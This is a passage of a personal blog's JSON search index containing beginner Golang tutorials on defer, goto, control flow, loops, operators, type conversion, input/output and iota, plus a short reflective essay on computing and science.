\"0722\" &#123; fmt.Println(\"阁下是巨蟹座\") &#125; else if birthday &gt;= \"0723\" &amp;&amp; birthday &lt;= \"0822\" &#123; fmt.Println(\"阁下是狮子座\") &#125; else &#123; fmt.Println(\"阁下就是传说中的蛇夫座鸭！\") &#125;&#125;func main071() &#123; fmt.Println(\"亲爱的患者，欢迎来到我院！\") //挂起一个延时任务（在当前函数返回（结束）前执行） defer fmt.Println(\"同志再见，我院永远欢迎你！\") xingzuoZhensuo() fmt.Println(\"事务A\") fmt.Println(\"事务B\") fmt.Println(\"事务C\")&#125;/*·诊断完毕后连续输出“您的诊断已结束”,“请这边滚”，“我院永远欢迎你”*/func main() &#123; fmt.Println(\"亲爱的患者，欢迎来到我院！\") /*多个defer时，执行顺序是倒置的*/ //第1个defer会倒数第1个执行 defer fmt.Println(\"我院永远欢迎你\") //第2个defer会倒数第2个执行 defer fmt.Println(\"请这边滚\") //第3个defer会倒数第3个执行 defer fmt.Println(\"您的诊断已结束\") xingzuoZhensuo() fmt.Println(\"事务A\") fmt.Println(\"事务B\") fmt.Println(\"事务C\")&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"延时执行defer","slug":"延时执行defer","permalink":"https://xiaowuyoucy.github.io/tags/延时执行defer/"}]},{"title":"Golang的跳转语句（GOTO）","slug":"201911190123","date":"2019-11-18T17:25:00.000Z","updated":"2019-11-18T17:26:00.356Z","comments":true,"path":"2019/11/19/201911190123/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190123/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package mainimport ( \"fmt\" \"time\")func main() &#123;STUDYHARD: fmt.Println(\"开始努力奋斗！\") var i int = 0 for &#123; fmt.Printf(\"努力奋斗了%d小时\\n\", i) time.Sleep(500 * time.Millisecond) i++ if i &gt; 10 &#123; //跳出当前循环 //break fmt.Println(\"恭喜你获得了组织颁发的奖状！\") goto TRYAGIN &#125; &#125; BONUS: fmt.Println(\"循环外的世界\") fmt.Println(\"送你海景别野一套\") fmt.Println(\"送你满汉全席一套\") fmt.Println(\"送你我厂生产的女朋友一个\")TRYAGIN: var answer string fmt.Println(\"要不要再玩一次呢？Y/N\") fmt.Scan(&amp;answer) if answer == \"N\" &#123; goto GAMEOVER &#125; else if answer == \"Y\" &#123; goto STUDYHARD &#125;else if answer == \"FUCKOFF\"&#123; goto BONUS &#125;GAMEOVER: fmt.Println(\"GAME OVER\")&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"GOTO语句","slug":"GOTO语句","permalink":"https://xiaowuyoucy.github.io/tags/GOTO语句/"}]},{"title":"Golang流程控制","slug":"201911182336","date":"2019-11-18T15:37:00.000Z","updated":"2019-11-18T16:01:40.381Z","comments":true,"path":"2019/11/18/201911182336/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/18/201911182336/","excerpt":"","text":"if else 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package mainimport \"fmt\"/*字符串比大小比首字符在字符集中出现的序号，首字符相同则比较第二个字符，以此类推go的编译器默认使用UTF8字符集在UTF8字符集中数字出现的顺序为：0123456789*/func main031() &#123; fmt.Println(\"0\"&gt;\"9\") fmt.Println(\"012\"&gt;\"011\") fmt.Println(\"0823\"&gt;\"0423\")&#125;/*根据用户输入的生日判断其星座：①单分支：如果位于0823-0922之间（处女座），输出“阁下真乃神人也！”*/func main032() &#123; var birthday string fmt.Println(\"请输入您的生日，例如0823\") fmt.Scan(&amp;birthday) if birthday &gt;= \"0823\" &amp;&amp; birthday&lt;=\"0922\"&#123; fmt.Println(\"阁下真乃神人也\") &#125; fmt.Println(\"诊断结束！\")&#125;/*根据用户输入的生日判断其星座：②双分支：如果位于0823-0922之间（处女座），输出“阁下乃神人也！”，否则输出“垃圾”*/func main033() &#123; var birthday string fmt.Println(\"请输入您的生日，例如0823\") fmt.Scan(&amp;birthday) if birthday &gt; \"0822\" &amp;&amp; birthday &lt; \"0923\"&#123; fmt.Println(\"阁下真乃神人也\") &#125;else&#123; fmt.Println(\"乐色\") &#125;&#125; else if 多分支 1234567891011121314151617181920212223242526272829303132333435363738/*根据用户输入的生日判断其星座：③多分支：判断其具体星座*/func main034() &#123; var birthday string fmt.Println(\"请输入您的生日，例如0823\") fmt.Scan(&amp;birthday) if birthday &gt;= \"0823\" &amp;&amp; birthday &lt;= \"0922\"&#123; fmt.Println(\"阁下真乃神人也\") &#125;else if birthday &gt;= \"0923\" &amp;&amp; birthday &lt;= \"1022\"&#123; fmt.Println(\"阁下是天秤座\") &#125;else if birthday &gt;= \"1023\" &amp;&amp; birthday &lt;= \"1122\"&#123; fmt.Println(\"阁下是天蝎座\") &#125;else if birthday &gt;= \"1123\" &amp;&amp; birthday &lt;= \"1222\"&#123; fmt.Println(\"阁下是射手座\") &#125;else if (birthday &gt;= \"1223\" &amp;&amp; birthday &lt;= \"1231\") || (birthday&gt;=\"0101\" &amp;&amp; birthday&lt;=\"0122\")&#123; fmt.Println(\"阁下是摩羯座\") &#125;else if birthday &gt;= \"0123\" &amp;&amp; birthday &lt;= \"0222\"&#123; fmt.Println(\"阁下是水瓶座\") &#125;else if (birthday &gt;= \"0223\" &amp;&amp; birthday &lt;= \"0229\")||(birthday&gt;=\"0301\" &amp;&amp; birthday&lt;=\"0322\")&#123; fmt.Println(\"阁下是双鱼座\") &#125;else if birthday &gt;= \"0323\" &amp;&amp; birthday &lt;= \"0422\"&#123; fmt.Println(\"阁下是白羊座\") &#125;else if birthday &gt;= \"0423\" &amp;&amp; birthday &lt;= \"0522\"&#123; fmt.Println(\"阁下是金牛座\") &#125;else if birthday &gt;= \"0523\" &amp;&amp; birthday &lt;= \"0622\"&#123; fmt.Println(\"阁下是双子座\") &#125;else if birthday &gt;= \"0623\" &amp;&amp; birthday &lt;= \"0722\"&#123; fmt.Println(\"阁下是巨蟹座\") &#125;else if birthday &gt;= \"0723\" &amp;&amp; birthday &lt;= \"0822\"&#123; fmt.Println(\"阁下是狮子座\") &#125;else&#123; fmt.Println(\"阁下就是传说中的蛇夫座鸭！\") &#125;&#125; SWITCH 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128package mainimport \"fmt\"/*@星座诊所2(switch)根据用户输入的出生月份猜测其星座：·白羊（4） 金牛（5） 双子（6） 巨蟹（7） 狮子（8） 处女（9） 天平（10） 天蝎（11） 射手（12） 摩羯（1） 水瓶（2） 双鱼（3）·使用单点case判断其星座；·使用单点case集合判断其季节（春夏秋冬）·使用自由条件case判断用户具体星座*/func main041() &#123; fmt.Println(\"请输入你的出生月份(1-12)\") var month int fmt.Scan(&amp;month) fmt.Printf(\"month=%d\", month) /* 对month的可能取值，做单点判断 */ switch month &#123; case 1: fmt.Printf(\"你大概率是%s座\\n\", \"摩羯\") case 2: fmt.Printf(\"你大概率是%s座\\n\", \"水瓶\") case 3: fmt.Printf(\"你大概率是%s座\\n\", \"双鱼\") case 4: fmt.Printf(\"你大概率是%s座\\n\", \"白羊\") case 5: fmt.Printf(\"你大概率是%s座\\n\", \"金牛\") case 6: fmt.Printf(\"你大概率是%s座\\n\", \"双子\") case 7: fmt.Printf(\"你大概率是%s座\\n\", \"巨蟹\") case 8: fmt.Printf(\"你大概率是%s座\\n\", \"狮子\") case 9: fmt.Printf(\"你大概率是%s座\\n\", \"处女\") case 10: fmt.Printf(\"你大概率是%s座\\n\", \"天平\") case 11: fmt.Printf(\"你大概率是%s座\\n\", \"天蝎\") case 12: fmt.Printf(\"你大概率是%s座\\n\", \"射手\") //month的值没有落在上述任何一种情形中 //default是可选的 default: fmt.Println(\"你就是传说中的蛇夫座\") &#125;&#125;/*·使用单点case集合判断其季节（春夏秋冬）*/func main042() &#123; fmt.Println(\"请输入你的出生月份(1-12)\") var month int fmt.Scan(&amp;month) switch month &#123; case 12, 1, 2: fmt.Println(\"你出生在冬天\") case 3, 4, 5: fmt.Println(\"你出生在春天\") case 6, 7, 8: fmt.Println(\"你出生在夏天\") case 9, 10, 11: fmt.Println(\"你出生在秋天\") default: fmt.Println(\"你出生在火星\") &#125;&#125;/*·使用自由条件case判断其季节（春夏秋冬）*/func main043() &#123; fmt.Println(\"请输入你的出生月份(1-12)\") var month int fmt.Scan(&amp;month) // 没有明确指定switch的对象，case可以跟任意判断条件 switch &#123; case month &gt;= 3 &amp;&amp; month &lt;= 5: fmt.Println(\"你出生在春天\") case month &gt;= 6 &amp;&amp; month &lt;= 8: fmt.Println(\"你出生在夏天\") case month &gt;= 9 &amp;&amp; month &lt;= 11: fmt.Println(\"你出生在秋天\") case month == 12 || month == 1 || month == 2: fmt.Println(\"你出生在冬天\") default: fmt.Println(\"你出生在火星\") &#125;&#125;/*使用fallthrough强制滚动到下一个分支并执行*/func main044() &#123; fmt.Println(\"请输入你的出生月份(1-12)\") var month int fmt.Scan(&amp;month) // 没有明确指定switch的对象，case可以跟任意判断条件 switch &#123; case month &gt;= 3 &amp;&amp; month &lt;= 5: fmt.Println(\"你出生在春天\") //强制执行下一个分支条件 fallthrough case month &gt;= 6 &amp;&amp; month &lt;= 8: fmt.Println(\"你出生在夏天\") fmt.Println(\"我们出生在上半年\") case month &gt;= 9 &amp;&amp; month &lt;= 11: fmt.Println(\"你出生在秋天\") //强制执行下一个分支条件 fallthrough case month == 12 || month == 1 || month == 2: fmt.Println(\"你出生在冬天\") fmt.Println(\"我们出生在下半年\") default: fmt.Println(\"你出生在火星\") &#125;&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang流程控制","slug":"Golang流程控制","permalink":"https://xiaowuyoucy.github.io/tags/Golang流程控制/"}]},{"title":"Golang类型转换及移位运算","slug":"201911180045","date":"2019-11-17T16:46:00.000Z","updated":"2019-11-17T17:24:35.343Z","comments":true,"path":"2019/11/18/201911180045/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/18/201911180045/","excerpt":"","text":"类型转换 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/*类型转换强化整型和浮点型可以直接强制转换字符串和数值的转换用strconv.ParseInt和strconv.ParseFloat*/func main024() &#123; var a int = 123 var b float64 = 456.78 //将整型转换为浮点型 aFloat := float64(a) //%T类型占位符，%v是值占位符 fmt.Printf(\"aFloat的类型是%T,值是%v\\n\",aFloat,aFloat) //浮点型转整型，小数部分扔掉 //bInt := int32(b) bInt := int(b) fmt.Printf(\"bInt的类型是%T,值是%v\\n\",bInt,bInt) //字符串转整型 resultInt, _ := strconv.ParseInt(\"123\", 0, 64) fmt.Printf(\"resultInt的类型是%T,值是%v\\n\",resultInt,resultInt) //字符串转浮点型 resultFloat, _ := strconv.ParseFloat(\"123.45\", 64) fmt.Printf(\"resultFloat的类型是%T,值是%v\\n\",resultFloat,resultFloat)&#125;/*移位运算强化*/func main() &#123; //10111 var a uint8 = 23 fmt.Println(a&gt;&gt;3)//2 //左移 fmt.Println(a&lt;&lt;3)//184 //继续移动，从左侧溢出，当前无符号，最高位是数据位而非符号位 fmt.Println(a&lt;&lt;5)//224 //定义有符号8位整型 var b int8 = 23 //10111000,最高位为1，为负数，为补码，减一取反得其原码（原码到补码取反加一的逆向） fmt.Println(b&lt;&lt;3)//-72&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang类型转换及移位运算","slug":"Golang类型转换及移位运算","permalink":"https://xiaowuyoucy.github.io/tags/Golang类型转换及移位运算/"}]},{"title":"Golang循环结构","slug":"201911190001","date":"2019-11-17T16:03:00.000Z","updated":"2019-11-18T19:33:59.906Z","comments":true,"path":"2019/11/18/201911190001/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/18/201911190001/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175package mainimport ( \"fmt\" \"math/rand\" \"time\")/*无限循环，死循环输出我爱拉芳，一直到死*/func main051() &#123; for &#123; fmt.Println(\"我爱拉芳\") time.Sleep(1 * time.Second) &#125;&#125;/*有限循环输出我爱拉芳，100遍for 起始条件;循环条件;增长条件&#123; 循环体&#125;*/func main052() &#123; /* var i int for i = 1; i &lt;= 10; i++ &#123; fmt.Printf(\"我爱拉芳%d年了\\n\", i) time.Sleep(1000 * time.Millisecond) &#125;*/ for i := 0; i &lt; 10; i++ &#123; fmt.Printf(\"我爱拉芳%d年了\\n\", i) time.Sleep(1000 * time.Millisecond) &#125; fmt.Println(\"终于可以爱别人了！\")&#125;/*倒序循环*/func main053() &#123; for i := 10; i &gt;= 1; i-- &#123; fmt.Println(i) time.Sleep(500 * time.Millisecond) &#125; fmt.Println(\"发射！\")&#125;/*打印 2 4 6 8 10... 100*/func main054() &#123; for i := 2; i &lt; 101; i += 2 &#123; fmt.Println(i) &#125;&#125;/*打一个10*5的“你妹”矩阵*/func main055() &#123; for j := 0; j &lt; 5; j++ &#123; //在同一行打印十个你妹 for i := 0; i &lt; 10; i++ &#123; fmt.Print(\"你妹\\t\\t\") &#125; fmt.Print(\"\\n\") &#125;&#125;/*打印九九乘法表*/func main056() &#123; for i := 1; i &lt;= 9; i++ &#123; for j := 1; j &lt;= i; j++ &#123; fmt.Print(j, \"*\", i, \"=\", j*i, \" \") &#125; fmt.Print(\"\\n\") &#125;&#125;func GetRandom() int &#123; /*获得随机数*/ //当前时间距离1970年0时所逝去的时间纳秒数 seed := time.Now().UnixNano() //使用当前时间纳秒作为随机数种子 myRandom := rand.New(rand.NewSource(seed)) //n := rand.Intn(1000) n := 100 + myRandom.Intn(900) //fmt.Println(n) //将结果随机数返回给调用者 return n&#125;/*·随机生成一个3位数答案·让用户输入其猜想·反馈给用户：猜大了、猜小了、猜对了·如果没猜对，就继续猜·猜对了就退出游戏·如果用户输入“-1”，就直接退出游戏*/func main057() &#123;START: //随机生成一个3位数答案 answer := GetRandom() fmt.Println(answer) var count int = 0 for &#123; /*让用户输入其猜想*/ var guess int fmt.Println(\"骚年请输入你的猜想(100-999),-1=退出，0=重玩，\") fmt.Scan(&amp;guess) /*看看用户是否想退出*/ if guess == -1 &#123; break &#125; else if guess == 0 &#123; goto START &#125; /*反馈给用户：猜大了、猜小了、猜对了*/ count ++ if guess &gt; answer &#123; fmt.Printf(\"猜大了,共用了%d次\\n\", count) &#125; else if guess &lt; answer &#123; fmt.Printf(\"猜小了,共用了%d次\\n\", count) &#125; else &#123; fmt.Printf(\"猜对了,共用了%d次\\n\", count) //跳出循环 break &#125; &#125; fmt.Println(\"GAME OVER\")&#125;/*打印1-49，逢5的整数倍就跳过*/func main058() &#123; var i int = 0 for &#123; i++ if i &gt; 49&#123; //跳出整个循环 break &#125; if i%5 == 0 &#123; //跳过本次循环的剩余部分，直接进入下一次循环 continue &#125; fmt.Print(\"当前是：\") fmt.Println(i) &#125; fmt.Println(\"GAME OVER\")&#125;func main() &#123; fmt.Println(GetRandom())&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang循环结构","slug":"Golang循环结构","permalink":"https://xiaowuyoucy.github.io/tags/Golang循环结构/"}]},{"title":"Golang程序运算","slug":"201911160050","date":"2019-11-15T16:51:18.000Z","updated":"2019-11-17T09:00:06.792Z","comments":true,"path":"2019/11/16/201911160050/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/16/201911160050/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153package mainimport ( \"fmt\" \"math\")func main() &#123; var a int = 10 /*自加1*/ //a = a + 2 //a += 2 //a++ /*自减1*/ //a = a - 1 //a -= 2 //a-- /*自乘运算*/ //a = a * 2 //a *= 2 //a = a / 2 //a /= 2 /*自求模（余）*/ //a = a % 3 a %= 3 fmt.Println(a)&#125;/*数学运算*/func main051() &#123; /*加减乘除，求余*/ fmt.Println(\"5+3=\", 5+3) //8 fmt.Println(\"5-3=\", 5-3) //2 fmt.Println(\"5*3=\", 5*3) //15 fmt.Println(\"5/3=\", 5/3) //1 fmt.Println(\"5%3=\", 5%3) //2 /*乘方和开方*/ fmt.Println(\"5^3=\", math.Pow(5, 3)) //125 fmt.Println(\"125开三次方=\", math.Pow(125.0, 1.0/3.0)) //5 /* 四舍五入 负数的四舍五入原则：先对绝对值四舍五入，再加负号 */ fmt.Println(\"3.49的四舍五入=\", math.Round(3.49)) //3 fmt.Println(\"3.51的四舍五入=\", math.Round(3.51)) //4 fmt.Println(\"-3.49的四舍五入=\", math.Round(-3.49)) //-3 fmt.Println(\"-3.51的四舍五入=\", math.Round(-3.51)) //-4 /*纯舍与纯入*/ fmt.Println(\"3.49的四舍五入=\", math.Floor(3.99)) //3 fmt.Println(\"3.51的四舍五入=\", math.Ceil(3.01)) //4 /*绝对值*/ fmt.Println(\"-3.14的绝对值\", math.Abs(-3.14)) //3.14 /* 三角函数： 参数必须是弧度而不是角度 */ fmt.Println(\"30°的正弦=\", math.Sin((30.0/180)*math.Pi)) fmt.Println(\"30°的余弦=\", math.Cos((30.0/180)*math.Pi)) fmt.Println(\"30°的正切=\", math.Tan((30.0/180)*math.Pi)) fmt.Println(\"30°的余切=\", 1.0/math.Tan((30.0/180)*math.Pi)) /*反三角函数*/ fmt.Println(\"正弦为0.5的角度是\", math.Asin(0.5)) //0.5235987755982989=30度的弧度表示&#125;/*比较运算比较运算符：&gt;,&lt;,==,!=,&gt;=,&lt;=比较运算的结果是布尔值：true或false*//*逻辑运算逻辑与：两者都为真，结果才为真逻辑或：两者只要有一个为真，结果就为真逻辑非：非真为假，非假为真*/func main052() &#123; a1 := (1+1 == 2) //true a0 := (1+1 != 2) //false b1 := (1+1 &gt;= 2) //true b0 := (1+1 &lt; 2) //false fmt.Println(a1, a0, b1, b0) /*逻辑与*/ fmt.Println(a1 &amp;&amp; b1) //true fmt.Println(a1 &amp;&amp; b0) //false fmt.Println(a0 &amp;&amp; b1) //false fmt.Println(a0 &amp;&amp; b0) //false /*逻辑或*/ fmt.Println(a1 || b1) //true fmt.Println(a1 || b0) //true fmt.Println(a0 || b1) //true fmt.Println(a0 || b0) //false /*逻辑或*/ fmt.Println(!a1) //false fmt.Println(!a0) //true fmt.Println(!b1) //false fmt.Println(!b0) //true&#125;/*位运算&amp; 按位与 两位都为1，结果才为1| 按位或 只要有一位为1，结果就为1^ 按位异或 两位不相同，结果就为1，否则就为0&lt;&lt;&gt;&gt;*/func main053() &#123; //a := 23 //b := 34 var a uint8 = 23 var b uint8 = 34 fmt.Println(a &amp; b) //2 fmt.Println(a | b) //55 fmt.Println(a ^ b) //53 /*移位运算*/ fmt.Println(a &lt;&lt; 2) //92 fmt.Println(a &gt;&gt; 2) //5 /* 左移的溢出 a为无符号8位整型，向左侧溢出后，最高位为数据位 */ fmt.Println(a &lt;&lt; 4) //112 fmt.Println(a &lt;&lt; 5) //1110,0000无符号为224 /* 左移的溢出 a为有符号8位整型，向左侧溢出后，最高位为符号位——要考虑正负数问题 最高位为0，非负数 最高位为1，负数的反码，-1再取反得到绝对值 */ var c int8 = 23 fmt.Println(c &lt;&lt; 5) //1110,0000有符号-32&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang程序运算","slug":"Golang程序运算","permalink":"https://xiaowuyoucy.github.io/tags/Golang程序运算/"}]},{"title":"Golang基础类型占位符","slug":"20191116038","date":"2019-11-15T16:40:18.000Z","updated":"2019-11-15T16:46:18.416Z","comments":true,"path":"2019/11/16/20191116038/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/16/20191116038/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758package mainimport \"fmt\"/*认识基本数据类型*/func main041() &#123; //整型 var a byte = 123 var b rune = 123 var c int = 123 var d uint = 123 fmt.Println(a,b,c,d) //浮点型 var rmb float32 = 1.23 //var atomRadius float64 = 1.234567890 var atomRadius = 1.234567890 fmt.Println(rmb,atomRadius) //字符串型 var name string = \"张三\" fmt.Println(name) //布尔型 var isClever = true var isBrave bool = false fmt.Println(isClever,isBrave) /*查看变量的类型*/ fmt.Printf(\"a的类型是%T\\n\",a) fmt.Printf(\"isClever的类型是%T\\n\",isClever) fmt.Printf(\"atomRadius的类型是%T\\n\",atomRadius) fmt.Printf(\"1.23的类型是%T\\n\",1.23) fmt.Printf(\"你妹的类型是%T\",\"你妹\") fmt.Printf(\"3+4i的类型是%T\",3+4i)&#125;/*基本类型占位符%s 字符串占位符%d 整型占位符（十进制）%f 浮点型占位符,%.2f精确到小数点后两位%t 布尔占位符*/func main() &#123; //使用占位符进行输出 fmt.Printf(\"我是%s,今年%d岁了，比特币余额%.2f，我美吗？——%t\\n\",\"比尔\",18,1.234567890,false) //输出时使用5字符宽度(默认右对齐) fmt.Printf(\"我是%5s,今年%5d岁了，比特币余额%5.2f，我美吗？——%5t\\n\",\"比尔\",18,1.234567890,false) //5位字符宽度，左对齐 fmt.Printf(\"我是%-5s,今年%-5d岁了，比特币余额%-5.2f，我美吗？——%-5t\\n\",\"比尔\",18,1.234567890,false) //打印并换行 fmt.Println(\"陈述完毕！\")&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang基础类型占位符","slug":"Golang基础类型占位符","permalink":"https://xiaowuyoucy.github.io/tags/Golang基础类型占位符/"}]},{"title":"Golang标准输入与输出","slug":"201911152305","date":"2019-11-15T15:06:01.000Z","updated":"2019-11-15T15:42:39.487Z","comments":true,"path":"2019/11/15/201911152305/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201911152305/","excerpt":"","text":"每次接收一个用户输入 1234567891011121314151617181920212223242526272829303132333435package mainimport ( \"fmt\" \"strconv\")func main031() &#123; //定义a,b两个字符串型变量，用于接收用户的输入（用户的任何输入在类型转换前都是字符串） var a, b string //提示用户输入两个数 fmt.Println(\"骚年请输入相加的两个数：\") //将用户输入的第一个“数据”存入a的内存地址（&amp;a代表对变量a取地址） fmt.Scan(&amp;a) //将用户的第二个输入存入b的内存地址 fmt.Scan(&amp;b) fmt.Println(\"a=\", a) //12 fmt.Println(\"b=\", b) //34 // 字符串的相加实际是拼接操作 fmt.Println(\"a+b=\", a+b) //1234 // 先将字符串a,b转化为64位整型，再做相加计算 //aInt，bInt的类型为整型 aInt, _ := strconv.ParseInt(a, 0, 64) bInt, _ := strconv.ParseInt(b, 0, 64) fmt.Println(\"a+b=\", aInt+bInt) //输出结果&#125; 一次性接收多个用户输入 12345678910111213func main() &#123; fmt.Println(\"请输入两个女神的名字\") //定义两个字符串变量 var godess1, godess2 string //一次性接收两个用户输入，分别存入godess1, godess2变量的内存 //多次输入之间用空格分隔 fmt.Scan(&amp;godess1, &amp;godess2) fmt.Println(\"你喜欢\", godess1) fmt.Println(\"你喜欢\", godess2)&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang基础","slug":"Golang基础","permalink":"https://xiaowuyoucy.github.io/tags/Golang基础/"},{"name":"Golang标准输入与输出","slug":"Golang标准输入与输出","permalink":"https://xiaowuyoucy.github.io/tags/Golang标准输入与输出/"}]},{"title":"iota定义常量组","slug":"201911152154","date":"2019-11-15T13:56:00.000Z","updated":"2019-11-15T16:26:26.564Z","comments":true,"path":"2019/11/15/201911152154/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201911152154/","excerpt":"","text":"iota常量组概述 第一个常量的iota，值为0 后面的常量自动沿用第一个常量的表达式 后面常量中的iota会自动递增 12345678910111213141516171819202122232425262728293031323334353637383940414243/** * @Author: Administrator * @Description: * @File: 2 使用ioat定义常量组 * @Version: 1.13.4 * @Date: 2019/11/15 21:34 */package mainimport \"fmt\"/*使用iota 定义一组常量后边的常量(iota)会以n+1的递增，iota的序号默认是以0开始的*///案例1const ( USA = iota + 1 China Russia Britain France)func main1() &#123; fmt.Println(USA,China,Russia,Britain,France) //输出结果：1 2 3 4 5&#125;//案例2const ( Spring = (iota + 1) * 2 Summer Autumn Winter)func main() &#123; fmt.Println(Spring,Summer,Autumn,Winter) //输出结果：2 4 6 8&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"iota定义常量组","slug":"iota定义常量组","permalink":"https://xiaowuyoucy.github.io/tags/iota定义常量组/"}]},{"title":"Golang","slug":"201911152138","date":"2019-11-15T13:38:18.000Z","updated":"2019-12-04T17:07:39.006Z","comments":true,"path":"2019/11/15/201911152138/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201911152138/","excerpt":"","text":"Golang基础 1.1 常量、变量、表达式 1.2 iota定义常量组 1.3 标准输入与输出 1.4 基础类型占位符 1.5 程序运算 1.6 类型转换及移位运算 1.7 流程控制 1.8 循环结构 1.9 GOTO语句 2.0 延时执行 defer 2.1 函数 2.2 匿名函数 2.3 闭包函数 2.4 指针","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/tags/Golang/"}]},{"title":"Golang常量与变量表达式","slug":"201911151907","date":"2019-11-15T11:09:18.000Z","updated":"2019-11-15T16:26:29.255Z","comments":true,"path":"2019/11/15/201911151907/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201911151907/","excerpt":"","text":"1.常量与表里表达式 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485/** * @Author: Administrator * @Description: * @File: 01常量变量表达式 * @Version: 1.13.4 * @Date: 2019/11/15 18:58 */// 包名（main包下的main函数是程序的入口）package main// 导入sdk（software developing kit）中的fmt包import \"fmt\"/*一次性定义多个常量定义在函数以外的常量对所有函数可见*/const ( lightSpeed = 300000 months = 12)/*一次性定义多个变量定义在函数以外的变量对所有函数可见*/var ( //驼峰风格的成员定义 yearSeconds = 365 * 24 * 3600 //首字母大写的成员对其它包可见 //YearSeconds = 365 * 24 * 3600 //小写字母+下划线风格的成员定义 //year_seconds = 365 * 24 * 3600 //一个月有30天 monthDays = 30)// 入口函数（main包下的main函数是程序的入口）func main01() &#123; // 定义圆周率常量 const pi = 3.14 // 定义圆的半径变量 var radius = 10.0 // 定义圆面积变量 var area = 0.0 // 使用表达式求圆的面积，赋值给面积变量 area = pi * radius * radius // 输出结果 fmt.Println(\"圆的面积是\", area)&#125;// 访问全局常量和变量（写在函数外部的成员可以被当前包下的所有函数访问）func main02() &#123; //计算一光年的距离 //var lightYearDistance = lightSpeed * yearSeconds //变量的声明赋值二合一（只能在函数内部） lightYearDistance := lightSpeed * yearSeconds //计算一年大概有多少天 seasonDays := monthDays * months fmt.Println(\"一光年有\",lightYearDistance,\"公里；一个年有\",seasonDays,\"天\")&#125;func main() &#123; // 一次性定义多个常量 const a,b,c = 1,2,3 //一次性定义多个变量 var d,e,f = 4,5,6 //输出 fmt.Println(a,b,c) fmt.Println(d,e,f)&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang基础","slug":"Golang基础","permalink":"https://xiaowuyoucy.github.io/tags/Golang基础/"},{"name":"Golang常量与变量里表达式","slug":"Golang常量与变量里表达式","permalink":"https://xiaowuyoucy.github.io/tags/Golang常量与变量里表达式/"}]},{"title":"计算机基础","slug":"201910190031","date":"2019-11-15T11:09:18.000Z","updated":"2019-11-17T09:02:41.207Z","comments":true,"path":"2019/11/15/201910190031/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201910190031/","excerpt":"","text":"简谈计算机 人类的起源直到今天都是一个未解之谜或者有争议性的话题。 这个问题引申一下可以诞生几个新的问题： 火星曾经有过生命吗？ 地球的起源。 月球的起源。 宇宙的起源。 我们常常听说，光的速度是每秒30万公里，地球诞生46亿年。 恐龙6500万年被毁灭。 人类是由猿猴演变而来。 水是生命的起源。 很多人把这些从小听到大的科普知识当做真理，公理去视为衡量一切的标准。 但人类随着科学的进步，历史上曾经视为一些公理的知识已经被推翻。 谁能肯定光速在传播的过程中，不会像声音一样因为不同的介质而发生改变。 谁能肯定人类测量历史，年份的技术手段是精确无误或者误差很小。 谁能肯定生命的形成必须倚靠氧气呢？ 我们带着求知的心理去学习，去探索，去研究。 但也要提醒自己，我此时此刻所处的这个时代，我今天所学的知识，不一定就是完全准确的，对未知要有一颗谦卑敬畏之心。 亚里斯多德时代奉为真理的东西很快就被推翻了，现在没掌握的东西没准哪天就被发现掌握了。 有兴趣的朋友，可以通过搜索引擎看一下让人震惊的“电子双缝干涉实验” 。 虽然未必每一个人都要成为“计算机科学家”或者“程序员”。 但当你开始接触这个专业的时候，从某种程度上说：“你也是踏入了科学世界的大门。” 人类经历了石器时代、青铜时代、铁器时代、以及标志着近代的蒸汽时代、电气时代 现在踏入了信息时代，下一个时代也许是生物智能时代…… 